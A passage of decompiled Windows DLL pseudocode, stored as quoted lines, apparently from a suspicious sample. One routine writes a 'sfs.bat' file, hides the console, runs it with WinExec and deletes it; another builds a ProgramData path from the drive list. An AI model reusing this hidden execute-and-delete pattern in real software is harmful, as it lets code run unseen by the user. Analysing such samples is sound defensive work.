    "    sub_1000A260(v356, v345, v288, v269, v270);",
    "  }",
    "  else",
    "  {",
    "    v357 += v345;",
    "    v188 = v356;",
    "    if ( v358 > 0xF )",
    "      v188 = (void **)v356[0];",
    "    v189 = (char *)v188 + v187;",
    "    memmove((char *)v188 + v187, v269, v270);",
    "    v189[v186] = 0;",
    "  }",
    "  if ( 0x7FFFFFFF - v314 < 8 )",
    "    sub_10001540();",
    "  v190 = PathName;",
    "  v270 = 8;",
    "  if ( v315 > 0xF )",
    "    v190 = *(CHAR **)PathName;",
    "  sub_1000A6C0(lpCmdLine, (int)v286, v314, v190, v314, \"\\\\sfs.bat\", v270);",
    "  LOBYTE(v360) = 45;",
    "  v286 = &v265;",
    "  sub_10009E70(&v265, v356);",
    "  LOBYTE(v360) = 46;",
    "  sub_10009E70(&v259, lpCmdLine);",
    "  LOBYTE(v360) = 45;",
    "  sub_1000C310(v259, v260, v261, v262, v263, v264, v265, v266, v267, v268, (int)v269, v270);",
    "  v270 = 0;",
    "  v191 = GetConsoleWindow();",
    "  ShowWindow(v191, v270);",
    "  v192 = (const CHAR *)lpCmdLine;",
    "  v270 = 0;",
    "  if ( v322 > 0xF )",
    "    v192 = lpCmdLine[0];",
    "  WinExec(v192, v270);",
    "  Sleep(0x7D0u);",
    "  v193 = (const CHAR *)lpCmdLine;",
    "  if ( v322 > 0xF )",
    "    v193 = lpCmdLine[0];",
    "  DeleteFileA(v193);",
    "  sub_10008500(v278);",
    "  if ( v280 > 0xF )",
    "  {",
    "    v194 = v278[0];",
    "    v195 = v280 + 1;",
    "    if ( v280 + 1 >= 0x1000 )",
    "    {",
    "      v194 = (void *)*((_DWORD *)v278[0] - 1);",
    "      v195 = v280 + 36;",
    "      if ( (unsigned int)((char *)v278[0] - (char *)v194 - 4) > 0x1F )",
    "        _invalid_parameter_noinfo_noreturn();",
    "    }",
    "    v270 = v195;",
    "    sub_100154EB(v194);",
    "  }",
    "  sub_10008890(v278);",
    "  if ( v280 > 0xF )",
    "  {",
    "    v196 = v278[0];",
    "    v197 = v280 + 1;",
    "    if ( v280 + 1 >= 0x1000 )",
    "    {",
    "      v196 = (void *)*((_DWORD *)v278[0] - 1);",
    "      v197 = v280 + 36;",
    "      if ( (unsigned int)((char *)v278[0] - (char *)v196 - 4) > 0x1F )",
    "        _invalid_parameter_noinfo_noreturn();",
    "    }",
    "    v270 = v197;",
    "    sub_100154EB(v196);",
    "  }",
    "  sub_1000C790();",
    "  if ( v322 > 0xF )",
    "  {",
    "    v198 = (CHAR *)lpCmdLine[0];",
    "    v199 = v322 + 1;",
    "    if ( v322 + 1 >= 0x1000 )",
    "    {",
    "      v198 = (CHAR *)*((_DWORD *)lpCmdLine[0] - 1);",
    "      v199 = v322 + 36;",
    "      if ( (unsigned int)(lpCmdLine[0] - (LPCSTR)v198 - 4) > 0x1F )",
    "        goto LABEL_436;",
    "    }",
    "    v270 = v199;",
    "    sub_100154EB(v198);",
    "  }",
    "  lpCmdLine[4] = 0;",
    "  v322 = 15;",
    "  LOBYTE(lpCmdLine[0]) = 0;",
    "  if ( v358 > 0xF )",
    "  {",
    "    v200 = v356[0];",
    "    v201 = v358 + 1;",
    "    if ( v358 + 1 >= 0x1000 )",
    "    {",
    "      v200 = (void *)*((_DWORD *)v356[0] - 1);",
    "      v201 = v358 + 36;",
    "      if ( (unsigned int)((char *)v356[0] - (char *)v200 - 4) > 0x1F )",
    "        goto LABEL_436;",
    "    }",
    "    v270 = v201;",
    "    sub_100154EB(v200);",
    "  }",
    "  v357 = 0;",
    "  v358 = 15;",
    "  LOBYTE(v356[0]) = 0;",
    "  if ( v346 > 0xF )",
    "  {",
    "    v202 = v344[0];",
    "    v203 = v346 + 1;",
    "    if ( v346 + 1 >= 0x1000 )",
    "    {",
    "      v202 = (void *)*((_DWORD *)v344[0] - 1);",
    "      v203 = v346 + 36;",
    "      if ( (unsigned int)((char *)v344[0] - (char *)v202 - 4) > 0x1F )",
    "        goto LABEL_436;",
    "    }",
    "    v270 = v203;",
    "    sub_100154EB(v202);",
    "  }",
    "  v345 = 0;",
    "  v346 = 15;",
    "  LOBYTE(v344[0]) = 0;",
    "  if ( v331 > 0xF )",
    "  {",
    "    v204 = v329[0];",
    "    v205 = v331 + 1;",
    "    if ( v331 + 1 >= 0x1000 )",
    "    {",
    "      v204 = (void *)*((_DWORD *)v329[0] - 1);",
    "      v205 = v331 + 36;",
    "      if ( (unsigned int)((char *)v329[0] - (char *)v204 - 4) > 0x1F )",
    "        goto LABEL_436;",
    "    }",
    "    v270 = v205;",
    "    sub_100154EB(v204);",
    "  }",
    "  v330 = 0;",
    "  v331 = 15;",
    "  LOBYTE(v329[0]) = 0;",
    "  if ( v343 > 0xF )",
    "  {",
    "    v206 = v341[0];",
    "    v207 = v343 + 1;",
    "    if ( v343 + 1 >= 0x1000 )",
    "    {",
    "      v206 = (void *)*((_DWORD *)v341[0] - 1);",
    "      v207 = v343 + 36;",
    "      if ( (unsigned int)((char *)v341[0] - (char *)v206 - 4) > 0x1F )",
    "        goto LABEL_436;",
    "    }",
    "    v270 = v207;",
    "    sub_100154EB(v206);",
    "  }",
    "  v342 = 0;",
    "  v343 = 15;",
    "  LOBYTE(v341[0]) = 0;",
    "  if ( HIDWORD(v294) > 0xF )",
    "  {",
    "    v208 = v293[0];",
    "    v209 = HIDWORD(v294) + 1;",
    "    if ( (unsigned int)(HIDWORD(v294) + 1) >= 0x1000 )",
    "    {",
    "      v208 = (void *)*((_DWORD *)v293[0] - 1);",
    "      v209 = HIDWORD(v294) + 36;",
    "      if ( (unsigned int)((char *)v293[0] - (char *)v208 - 4) > 0x1F )",
    "        goto LABEL_436;",
    "    }",
    "    v270 = v209;",
    "    sub_100154EB(v208);",
    "  }",
    "  if ( v334 > 0xF )",
    "  {",
    "    v210 = v332[0];",
    "    v211 = v334 + 1;",
    "    if ( v334 + 1 >= 0x1000 )",
    "    {",
    "      v210 = (void *)*((_DWORD *)v332[0] - 1);",
    "      v211 = v334 + 36;",
    "      if ( (unsigned int)((char *)v332[0] - (char *)v210 - 4) > 0x1F )",
    "        goto LABEL_436;",
    "    }",
    "    v270 = v211;",
    "    sub_100154EB(v210);",
    "  }",
    "  v333 = 0;",
    "  v334 = 15;",
    "  LOBYTE(v332[0]) = 0;",
    "  if ( v349 > 0xF )",
    "  {",
    "    v212 = v347[0];",
    "    v213 = v349 + 1;",
    "    if ( v349 + 1 >= 0x1000 )",
    "    {",
    "      v212 = (void *)*((_DWORD *)v347[0] - 1);",
    "      v213 = v349 + 36;",
    "      if ( (unsigned int)((char *)v347[0] - (char *)v212 - 4) > 0x1F )",
    "        goto LABEL_436;",
    "    }",
    "    v270 = v213;",
    "    sub_100154EB(v212);",
    "  }",
    "  v348 = 0;",
    "  v349 = 15;",
    "  LOBYTE(v347[0]) = 0;",
    "  if ( v298 > 7 )",
    "  {",
    "    v214 = v297[0];",
    "    v215 = 2 * v298 + 2;",
    "    if ( v215 >= 0x1000 )",
    "    {",
    "      v214 = (void *)*((_DWORD *)v297[0] - 1);",
    "      v215 = 2 * v298 + 37;",
    "      if ( (unsigned int)((char *)v297[0] - (char *)v214 - 4) > 0x1F )",
    "        goto LABEL_436;",
    "    }",
    "    v270 = v215;",
    "    sub_100154EB(v214);",
    "  }",
    "  v297[4] = 0;",
    "  v298 = 7;",
    "  LOWORD(v297[0]) = 0;",
    "  if ( v328 > 7 )",
    "  {",
    "    v216 = v326[0];",
    "    v217 = 2 * v328 + 2;",
    "    if ( v217 >= 0x1000 )",
    "    {",
    "      v216 = (void *)*((_DWORD *)v326[0] - 1);",
    "      v217 = 2 * v328 + 37;",
    "      if ( (unsigned int)((char *)v326[0] - (char *)v216 - 4) > 0x1F )",
    "        goto LABEL_436;",
    "    }",
    "    v270 = v217;",
    "    sub_100154EB(v216);",
    "  }",
    "  v327 = 0;",
    "  v328 = 7;",
    "  LOWORD(v326[0]) = 0;",
    "  if ( v315 > 0xF )",
    "  {",
    "    v218 = *(CHAR **)PathName;",
    "    v219 = v315 + 1;",
    "    if ( v315 + 1 >= 0x1000 )",
    "    {",
    "      v218 = *(CHAR **)(*(_DWORD *)PathName - 4);",
    "      v219 = v315 + 36;",
    "      if ( (unsigned int)(*(_DWORD *)PathName - (_DWORD)v218 - 4) > 0x1F )",
    "        goto LABEL_436;",
    "    }",
    "    v270 = v219;",
    "    sub_100154EB(v218);",
    "  }",
    "  v314 = 0;",
    "  v315 = 15;",
    "  PathName[0] = 0;",
    "  if ( v352 > 0xF )",
    "  {",
    "    v220 = v350[0];",
    "    v221 = v352 + 1;",
    "    if ( v352 + 1 >= 0x1000 )",
    "    {",
    "      v220 = (void *)*((_DWORD *)v350[0] - 1);",
    "      v221 = v352 + 36;",
    "      if ( (unsigned int)((char *)v350[0] - (char *)v220 - 4) > 0x1F )",
    "        goto LABEL_436;",
    "    }",
    "    v270 = v221;",
    "    sub_100154EB(v220);",
    "  }",
    "  Size = 0;",
    "  v352 = 15;",
    "  LOBYTE(v350[0]) = 0;",
    "  if ( v318 > 0xF )",
    "  {",
    "    v222 = v316[0];",
    "    v223 = v318 + 1;",
    "    if ( v318 + 1 >= 0x1000 )",
    "    {",
    "      v222 = (void *)*((_DWORD *)v316[0] - 1);",
    "      v223 = v318 + 36;",
    "      if ( (unsigned int)((char *)v316[0] - (char *)v222 - 4) > 0x1F )",
    "        goto LABEL_436;",
    "    }",
    "    v270 = v223;",
    "    sub_100154EB(v222);",
    "  }",
    "  v317 = 0;",
    "  v318 = 15;",
    "  LOBYTE(v316[0]) = 0;",
    "  if ( v340 > 7 )",
    "  {",
    "    v224 = v338[0];",
    "    v225 = 2 * v340 + 2;",
    "    if ( v225 >= 0x1000 )",
    "    {",
    "      v224 = (void *)*((_DWORD *)v338[0] - 1);",
    "      v225 = 2 * v340 + 37;",
    "      if ( (unsigned int)((char *)v338[0] - (char *)v224 - 4) > 0x1F )",
    "        goto LABEL_436;",
    "    }",
    "    v270 = v225;",
    "    sub_100154EB(v224);",
    "  }",
    "  v339 = 0;",
    "  v340 = 7;",
    "  LOWORD(v338[0]) = 0;",
    "  if ( v337 > 7 )",
    "  {",
    "    v226 = Src[0];",
    "    v227 = 2 * v337 + 2;",
    "    if ( v227 >= 0x1000 )",
    "    {",
    "      v226 = (void *)*((_DWORD *)Src[0] - 1);",
    "      v227 = 2 * v337 + 37;",
    "      if ( (unsigned int)((char *)Src[0] - (char *)v226 - 4) > 0x1F )",
    "        goto LABEL_436;",
    "    }",
    "    v270 = v227;",
    "    sub_100154EB(v226);",
    "  }",
    "  v336 = 0;",
    "  v337 = 7;",
    "  LOWORD(Src[0]) = 0;",
    "  if ( v355 > 7 )",
    "  {",
    "    v228 = v353[0];",
    "    v229 = 2 * v355 + 2;",
    "    if ( v229 >= 0x1000 )",
    "    {",
    "      v228 = (void *)*((_DWORD *)v353[0] - 1);",
    "      v229 = 2 * v355 + 37;",
    "      if ( (unsigned int)((char *)v353[0] - (char *)v228 - 4) > 0x1F )",
    "        goto LABEL_436;",
    "    }",
    "    v270 = v229;",
    "    sub_100154EB(v228);",
    "  }",
    "  v354 = 0;",
    "  v355 = 7;",
    "  LOWORD(v353[0]) = 0;",
    "  if ( v325 > 7 )",
    "  {",
    "    v230 = v323[0];",
    "    v231 = 2 * v325 + 2;",
    "    if ( v231 >= 0x1000 )",
    "    {",
    "      v230 = (void *)*((_DWORD *)v323[0] - 1);",
    "      v231 = 2 * v325 + 37;",
    "      if ( (unsigned int)((char *)v323[0] - (char *)v230 - 4) > 0x1F )",
    "        goto LABEL_436;",
    "    }",
    "    v270 = v231;",
    "    sub_100154EB(v230);",
    "  }",
    "  v324 = 0;",
    "  v325 = 7;",
    "  LOWORD(v323[0]) = 0;",
    "  if ( v302 > 0xF )",
    "  {",
    "    v232 = v301[0];",
    "    v233 = v302 + 1;",
    "    if ( v302 + 1 >= 0x1000 )",
    "    {",
    "      v232 = (void *)*((_DWORD *)v301[0] - 1);",
    "      v233 = v302 + 36;",
    "      if ( (unsigned int)((char *)v301[0] - (char *)v232 - 4) > 0x1F )",
    "        goto LABEL_436;",
    "    }",
    "    v270 = v233;",
    "    sub_100154EB(v232);",
    "  }",
    "  v301[4] = 0;",
    "  v302 = 15;",
    "  LOBYTE(v301[0]) = 0;",
    "  if ( HIDWORD(v320) <= 0xF )",
    "    goto LABEL_391;",
    "  v234 = Block[0];",
    "  v235 = HIDWORD(v320) + 1;",
    "  if ( (unsigned int)(HIDWORD(v320) + 1) >= 0x1000 )",
    "  {",
    "    v234 = (void *)*((_DWORD *)Block[0] - 1);",
    "    v235 = HIDWORD(v320) + 36;",
    "    if ( (unsigned int)((char *)Block[0] - (char *)v234 - 4) > 0x1F )",
    "LABEL_436:",
    "      _invalid_parameter_noinfo_noreturn();",
    "  }",
    "  v270 = v235;",
    "  sub_100154EB(v234);",
    "LABEL_391:",
    "  if ( v296 > 7 )",
    "  {",
    "    v236 = v295[0];",
    "    v237 = 2 * v296 + 2;",
    "    if ( v237 >= 0x1000 )",
    "    {",
    "      v236 = (void *)*((_DWORD *)v295[0] - 1);",
    "      v237 = 2 * v296 + 37;",
    "      if ( (unsigned int)((char *)v295[0] - (char *)v236 - 4) > 0x1F )",
    "        goto LABEL_437;",
    "    }",
    "    v270 = v237;",
    "    sub_100154EB(v236);",
    "  }",
    "  v295[4] = 0;",
    "  v296 = 7;",
    "  LOWORD(v295[0]) = 0;",
    "  if ( v292 > 0xF )",
    "  {",
    "    v238 = v291[0];",
    "    v239 = v292 + 1;",
    "    if ( v292 + 1 >= 0x1000 )",
    "    {",
    "      v238 = (void *)*((_DWORD *)v291[0] - 1);",
    "      v239 = v292 + 36;",
    "      if ( (unsigned int)((char *)v291[0] - (char *)v238 - 4) > 0x1F )",
    "        goto LABEL_437;",
    "    }",
    "    v270 = v239;",
    "    sub_100154EB(v238);",
    "  }",
    "  if ( v300 > 0xF )",
    "  {",
    "    v240 = (CHAR *)lpMultiByteStr[0];",
    "    v241 = v300 + 1;",
    "    if ( v300 + 1 >= 0x1000 )",
    "    {",
    "      v240 = (CHAR *)*((_DWORD *)lpMultiByteStr[0] - 1);",
    "      v241 = v300 + 36;",
    "      if ( (unsigned int)(lpMultiByteStr[0] - (LPCCH)v240 - 4) > 0x1F )",
    "        goto LABEL_437;",
    "    }",
    "    v270 = v241;",
    "    sub_100154EB(v240);",
    "  }",
    "  lpMultiByteStr[4] = 0;",
    "  v300 = 15;",
    "  LOBYTE(lpMultiByteStr[0]) = 0;",
    "  if ( v312 > 0xF )",
    "  {",
    "    v242 = v311[0];",
    "    v243 = v312 + 1;",
    "    if ( v312 + 1 >= 0x1000 )",
    "    {",
    "      v242 = (void *)*((_DWORD *)v311[0] - 1);",
    "      v243 = v312 + 36;",
    "      if ( (unsigned int)((char *)v311[0] - (char *)v242 - 4) > 0x1F )",
    "        goto LABEL_437;",
    "    }",
    "    v270 = v243;",
    "    sub_100154EB(v242);",
    "  }",
    "  v311[4] = 0;",
    "  v312 = 15;",
    "  LOBYTE(v311[0]) = 0;",
    "  if ( v304 > 0xF )",
    "  {",
    "    v244 = v303[0];",
    "    v245 = v304 + 1;",
    "    if ( v304 + 1 >= 0x1000 )",
    "    {",
    "      v244 = (void *)*((_DWORD *)v303[0] - 1);",
    "      v245 = v304 + 36;",
    "      if ( (unsigned int)((char *)v303[0] - (char *)v244 - 4) > 0x1F )",
    "        goto LABEL_437;",
    "    }",
    "    v270 = v245;",
    "    sub_100154EB(v244);",
    "  }",
    "  v303[4] = 0;",
    "  v304 = 15;",
    "  LOBYTE(v303[0]) = 0;",
    "  if ( v310 > 0xF )",
    "  {",
    "    v246 = v309[0];",
    "    v247 = v310 + 1;",
    "    if ( v310 + 1 >= 0x1000 )",
    "    {",
    "      v246 = (void *)*((_DWORD *)v309[0] - 1);",
    "      v247 = v310 + 36;",
    "      if ( (unsigned int)((char *)v309[0] - (char *)v246 - 4) > 0x1F )",
    "        goto LABEL_437;",
    "    }",
    "    v270 = v247;",
    "    sub_100154EB(v246);",
    "  }",
    "  v309[4] = 0;",
    "  v310 = 15;",
    "  LOBYTE(v309[0]) = 0;",
    "  if ( v308 > 0xF )",
    "  {",
    "    v248 = v307[0];",
    "    v249 = v308 + 1;",
    "    if ( v308 + 1 >= 0x1000 )",
    "    {",
    "      v248 = (void *)*((_DWORD *)v307[0] - 1);",
    "      v249 = v308 + 36;",
    "      if ( (unsigned int)((char *)v307[0] - (char *)v248 - 4) > 0x1F )",
    "        goto LABEL_437;",
    "    }",
    "    v270 = v249;",
    "    sub_100154EB(v248);",
    "  }",
    "  v307[4] = 0;",
    "  v308 = 15;",
    "  LOBYTE(v307[0]) = 0;",
    "  if ( v290 > 0xF )",
    "  {",
    "    v250 = v289[0];",
    "    v251 = v290 + 1;",
    "    if ( v290 + 1 < 0x1000",
    "      || (v250 = (void *)*((_DWORD *)v289[0] - 1),",
    "          v251 = v290 + 36,",
    "          (unsigned int)((char *)v289[0] - (char *)v250 - 4) <= 0x1F) )",
    "    {",
    "      v270 = v251;",
    "      sub_100154EB(v250);",
    "      return 1;",
    "    }",
    "LABEL_437:",
    "    _invalid_parameter_noinfo_noreturn();",
    "  }",
    "  return 1;",
    "}",
    "",
    "",
    "_DWORD *__stdcall sub_100113C0(_DWORD *a1)",
    "{",
    "  DWORD LogicalDriveStringsW; // esi",
    "  void **v2; // edx",
    "  void **v3; // edi",
    "  void **v4; // edx",
    "  size_t v5; // ecx",
    "  unsigned int v6; // edx",
    "  unsigned int v7; // edx",
    "  unsigned int v8; // esi",
    "  size_t v9; // ecx",
    "  void *v10; // eax",
    "  void *v11; // ecx",
    "  void *v12; // eax",
    "  bool v13; // cc",
    "  void **v14; // ecx",
    "  unsigned int v15; // esi",
    "  void **v16; // eax",
    "  void *v17; // edx",
    "  void *v18; // edx",
    "  int v20; // [esp+0h] [ebp-58h]",
    "  WCHAR *Srcb; // [esp+14h] [ebp-44h]",
    "  void *Src; // [esp+14h] [ebp-44h]",
    "  void **Srca; // [esp+14h] [ebp-44h]",
    "  void *v24[4]; // [esp+18h] [ebp-40h] BYREF",
    "  int v25; // [esp+28h] [ebp-30h]",
    "  unsigned int v26; // [esp+2Ch] [ebp-2Ch]",
    "  void *Block[4]; // [esp+30h] [ebp-28h] BYREF",
    "  size_t v28; // [esp+40h] [ebp-18h]",
    "  unsigned int v29; // [esp+44h] [ebp-14h]",
    "  int v30; // [esp+54h] [ebp-4h]",
    "",
    "  LogicalDriveStringsW = GetLogicalDriveStringsW(0, 0);",
    "  Srcb = (WCHAR *)sub_1001CC90(saturated_mul(2u, LogicalDriveStringsW + 1));",
    "  GetLogicalDriveStringsW(LogicalDriveStringsW, Srcb);",
    "  v25 = 0;",
    "  *(_OWORD *)v24 = 0;",
    "  v26 = 0;",
    "  sub_1000A170(v24, Srcb, wcslen(Srcb));",
    "  v30 = 0;",
    "  v2 = v24;",
    "  v3 = v24;",
    "  if ( v26 > 7 )",
    "  {",
    "    v2 = (void **)v24[0];",
    "    v3 = (void **)v24[0];",
    "  }",
    "  *(_OWORD *)Block = 0;",
    "  v4 = (void **)((char *)v2 + 2 * v25);",
    "  if ( v3 == v4 )",
    "  {",
    "    v5 = 0;",
    "    v6 = 15;",
    "    v28 = 0;",
    "    v29 = 15;",
    "    LOBYTE(Block[0]) = 0;",
    "    goto LABEL_25;",
    "  }",
    "  v28 = 0;",
    "  v7 = ((char *)v4 - (char *)v3) >> 1;",
    "  Src = (void *)v7;",
    "  v29 = 15;",
    "  if ( v7 > 0x7FFFFFFF )",
    "    sub_10001540();",
    "  v8 = 15;",
    "  if ( v7 <= 0xF )",
    "  {",
    "    v12 = Block[0];",
    "  }",
    "  else",
    "  {",
    "    v8 = v7 | 0xF;",
    "    if ( (v7 | 0xF) > 0x7FFFFFFF )",
    "    {",
    "      v8 = 0x7FFFFFFF;",
    "      v9 = -2147483613;",
    "LABEL_9:",
    "      v10 = operator new(v9);",
    "      v11 = v10;",
    "      if ( !v10 )",
    "        goto LABEL_40;",
    "      v7 = (unsigned int)Src;",
    "      v12 = (void *)(((unsigned int)v10 + 35) & 0xFFFFFFE0);",
    "      v29 = v8;",
    "      Block[0] = v12;",
    "      *((_DWORD *)v12 - 1) = v11;",
    "      goto LABEL_20;",
    "    }",
    "    if ( v8 < 0x16 )",
    "      v8 = 22;",
    "    v12 = (void *)(v8 + 1);",
    "    if ( v8 == -1 )",
    "    {",
    "      Block[0] = 0;",
    "      v29 = -1;",
    "    }",
    "    else",
    "    {",
    "      if ( (unsigned int)v12 >= 0x1000 )",
    "      {",
    "        v9 = v8 + 36;",
    "        if ( v8 + 36 < v8 + 1 )",
    "          sub_100014A0(v20);",
    "        goto LABEL_9;",
    "      }",
    "      v12 = operator new(v8 + 1);",
    "      v7 = (unsigned int)Src;",
    "      Block[0] = v12;",
    "      v29 = v8;",
    "    }",
    "  }",
    "LABEL_20:",
    "  v13 = v8 <= 0xF;",
    "  v14 = Block;",
    "  v15 = v7;",
    "  if ( !v13 )",
    "    v14 = (void **)v12;",
    "  Srca = v14;",
    "  if ( v7 )",
    "  {",
    "    do",
    "    {",
    "      v14 = (void **)((char *)v14 + 1);",
    "      *((_BYTE *)v14 - 1) = *(_BYTE *)v3;",
    "      v3 = (void **)((char *)v3 + 2);",
    "      --v15;",
    "    }",
    "    while ( v15 );",
    "  }",
    "  v28 = v7;",
    "  *((_BYTE *)Srca + v7) = 0;",
    "  v6 = v29;",
    "  v5 = v28;",
    "LABEL_25:",
    "  LOBYTE(v30) = 1;",
    "  if ( 0x7FFFFFFF - v5 < 0xB )",
    "    sub_10001540();",
    "  v16 = Block;",
    "  if ( v6 > 0xF )",
    "    v16 = (void **)Block[0];",
    "  sub_1000A6C0(a1, (int)a1, v5, v16, v5, \"ProgramData\", 0xBu);",
    "  if ( v29 > 0xF )",
    "  {",
    "    v17 = Block[0];",
    "    if ( v29 + 1 >= 0x1000 )",
    "    {",
    "      v17 = (void *)*((_DWORD *)Block[0] - 1);",
    "      if ( (unsigned int)((char *)Block[0] - (char *)v17 - 4) > 0x1F )",
    "        goto LABEL_40;",
    "    }",
    "    sub_100154EB(v17);",
    "  }",
    "  if ( v26 > 7 )",
    "  {",
    "    v18 = v24[0];",
    "    if ( 2 * v26 + 2 < 0x1000",
    "      || (v18 = (void *)*((_DWORD *)v24[0] - 1), (unsigned int)((char *)v24[0] - (char *)v18 - 4) <= 0x1F) )",
    "    {",
    "      sub_100154EB(v18);",
    "      return a1;",
    "    }",
    "LABEL_40:",
    "    _invalid_parameter_noinfo_noreturn();",
    "  }",
    "  return a1;",
    "}",
    "",
    "",
    "char __usercall VelocitySpeed@<al>(size_t a1@<ebx>)",
    "{",
    "  int v1; // eax",
    "",
    "  v1 = sub_1000A970();",
    "  sub_1000F100(v1, a1);",
    "  return 1;",
    "}",
    "",
    "",
    "char LOPP()",
    "{",
    "  _BYTE *v0; // eax",
    "",
    "  v0 = (_BYTE *)sub_1000A970();",
    "  sub_1000D290(v0);",
    "  return 1;",
    "}",
    "",
    "",
    "// bad sp value at call has been detected, the output may be wrong!",
    "void **__thiscall sub_100116D0(void **Src, unsigned int a2, int a3, const void *a4, int a5)",
    "{",
    "}_DWORD *__thiscall sub_10011850(_DWORD *this, int a2, int a3, const void *a4, int a5, const void *a6, int a7)",
    "{",
    "  int v7; // edx",
    "  int v9; // ecx",
    "  unsigned int v10; // esi",
    "  _DWORD *v11; // edi",
    "  size_t v12; // eax",
    "  void *v13; // eax",
    "  int v14; // esi",
    "  int v16; // [esp-Ch] [ebp-1Ch]",
    "",
    "  v7 = a5;",
    "  v9 = a5 + a7;",
    "  v10 = 7;",
    "  *(_OWORD *)this = 0;",
    "  this[4] = 0;",
    "  this[5] = 0;",
    "  v11 = this;",
    "  if ( (unsigned int)(a5 + a7) > 7 )",
    "  {",
    "    v10 = v9 | 7;",
    "    if ( (v9 | 7u) <= 0x7FFFFFFE )",
    "    {",
    "      if ( v10 < 0xA )",
    "        v10 = 10;",
    "      if ( v10 + 1 > 0x7FFFFFFF )",
    "        goto LABEL_17;",
    "      v12 = 2 * (v10 + 1);",
    "      if ( !v12 )",
    "      {",
    "        v11 = 0;",
    "LABEL_15:",
    "        *this = v11;",
    "        goto LABEL_16;",
    "      }",
    "    }",
    "    else",
    "    {",
    "      v10 = 2147483646;",
    "      v12 = -2;",
    "    }",
    "    if ( v12 < 0x1000 )",
    "    {",
    "      v11 = operator new(v12);",
    "LABEL_14:",
    "      v7 = a5;",
    "      v9 = a5 + a7;",
    "      goto LABEL_15;",
    "    }",
    "    if ( v12 + 35 >= v12 )",
    "    {",
    "      v13 = operator new(v12 + 35);",
    "      if ( !v13 )",
    "        _invalid_parameter_noinfo_noreturn();",
    "      v11 = (_DWORD *)(((unsigned int)v13 + 35) & 0xFFFFFFE0);",
    "      *(v11 - 1) = v13;",
    "      goto LABEL_14;",
    "    }",
    "LABEL_17:",
    "    sub_100014A0(v16);",
    "  }",
    "LABEL_16:",
    "  this[5] = v10;",
    "  v14 = 2 * v7;",
    "  this[4] = v9;",
    "  memmove(v11, a4, 2 * v7);",
    "  memmove((char *)v11 + v14, a6, 2 * a7);",
    "  *((_WORD *)v11 + a5 + a7) = 0;",
    "  return this;",
    "}",
    "",
    "",
    "// bad sp value at call has been detected, the output may be wrong!",
    "void **__thiscall sub_10011950(void **Src, unsigned int a2, int a3, int a4, int a5, int a6)",
    "{",
    "}void  sub_10011AB0()",
    "{",
    "  sub_10014CB2(\"invalid bitset char\");",
    "}",
    "",
    "",
    "int __stdcall sub_10011AC0(int a1, __int128 Block, __int64 a3, char a4)",
    "{",
    "  __int128 *p_Block; // esi",
    "  int v5; // eax",
    "  unsigned int v6; // esi",
    "  unsigned int v7; // ecx",
    "  __int128 *v8; // eax",
    "  unsigned int v9; // esi",
    "  __int128 *v10; // eax",
    "  void *v11; // edx",
    "  size_t *v12; // eax",
    "  void *v13; // edx",
    "  size_t *v14; // eax",
    "  __int128 *v15; // eax",
    "  void *v16; // edx",
    "  __int128 v18; // [esp+Ch] [ebp-4Ch] BYREF",
    "  __int64 v19; // [esp+1Ch] [ebp-3Ch]",
    "  int v20; // [esp+24h] [ebp-34h]",
    "  __int128 *v21; // [esp+28h] [ebp-30h]",
    "  int v22; // [esp+2Ch] [ebp-2Ch]",
    "  void *v23[4]; // [esp+30h] [ebp-28h] BYREF",
    "  int v24; // [esp+40h] [ebp-18h]",
    "  unsigned int v25; // [esp+44h] [ebp-14h]",
    "  int v26; // [esp+54h] [ebp-4h]",
    "",
    "  v20 = a1;",
    "  v26 = 1;",
    "  *(_QWORD *)a1 = 0;",
    "  *(_DWORD *)(a1 + 8) = 0;",
    "  *(_DWORD *)a1 = 0;",
    "  *(_DWORD *)(a1 + 4) = 0;",
    "  *(_DWORD *)(a1 + 8) = 0;",
    "  v22 = 1;",
    "  while ( (_DWORD)a3 )",
    "  {",
    "    p_Block = &Block;",
    "    if ( HIDWORD(a3) > 7 )",
    "      p_Block = (__int128 *)Block;",
    "    v21 = p_Block;",
    "    v5 = a3;",
    "    while ( *(_WORD *)p_Block != a4 )",
    "    {",
    "      p_Block = (__int128 *)((char *)p_Block + 2);",
    "      if ( !--v5 )",
    "        goto LABEL_8;",
    "    }",
    "    if ( !p_Block )",
    "    {",
    "LABEL_8:",
    "      v6 = -1;",
    "      goto LABEL_9;",
    "    }",
    "    v6 = ((char *)p_Block - (char *)v21) >> 1;",
    "LABEL_9:",
    "    if ( v6 == -1 )",
    "    {",
    "      v14 = *(size_t **)(a1 + 4);",
    "      if ( v14 == *(size_t **)(a1 + 8) )",
    "      {",
    "        sub_10014500(v14, &Block);",
    "      }",
    "      else",
    "      {",
    "        sub_10009D70(v14, &Block);",
    "        *(_DWORD *)(a1 + 4) += 24;",
    "      }",
    "      v15 = &Block;",
    "      LODWORD(a3) = 0;",
    "      if ( HIDWORD(a3) > 7 )",
    "        v15 = (__int128 *)Block;",
    "      *(_WORD *)v15 = 0;",
    "    }",
    "    else",
    "    {",
    "      v24 = 0;",
    "      v7 = v6;",
    "      v25 = 0;",
    "      if ( (unsigned int)a3 < v6 )",
    "        v7 = a3;",
    "      v8 = &Block;",
    "      if ( HIDWORD(a3) > 7 )",
    "        v8 = (__int128 *)Block;",
    "      *(_OWORD *)v23 = 0;",
    "      sub_1000A170(v23, v8, v7);",
    "      v22 |= 2u;",
    "      LOBYTE(v26) = 2;",
    "      v9 = v6 + 1;",
    "      v19 = 0;",
    "      v18 = 0;",
    "      if ( (unsigned int)a3 < v9 )",
    "        sub_10003520();",
    "      v10 = &Block;",
    "      if ( HIDWORD(a3) > 7 )",
    "        v10 = (__int128 *)Block;",
    "      sub_1000A170(&v18, (char *)v10 + 2 * v9, a3 - v9);",
    "      v22 |= 4u;",
    "      if ( HIDWORD(a3) > 7 )",
    "      {",
    "        v11 = (void *)Block;",
    "        if ( (unsigned int)(2 * HIDWORD(a3) + 2) >= 0x1000 )",
    "        {",
    "          v11 = *(void **)(Block - 4);",
    "          if ( (unsigned int)(Block - (_DWORD)v11 - 4) > 0x1F )",
    "            goto LABEL_42;",
    "        }",
    "        sub_100154EB(v11);",
    "      }",
    "      v12 = *(size_t **)(a1 + 4);",
    "      Block = v18;",
    "      a3 = v19;",
    "      if ( v12 == *(size_t **)(a1 + 8) )",
    "      {",
    "        sub_10014500(v12, v23);",
    "      }",
    "      else",
    "      {",
    "        sub_10009D70(v12, v23);",
    "        *(_DWORD *)(a1 + 4) += 24;",
    "      }",
    "      LOBYTE(v26) = 1;",
    "      if ( v25 > 7 )",
    "      {",
    "        v13 = v23[0];",
    "        if ( 2 * v25 + 2 >= 0x1000 )",
    "        {",
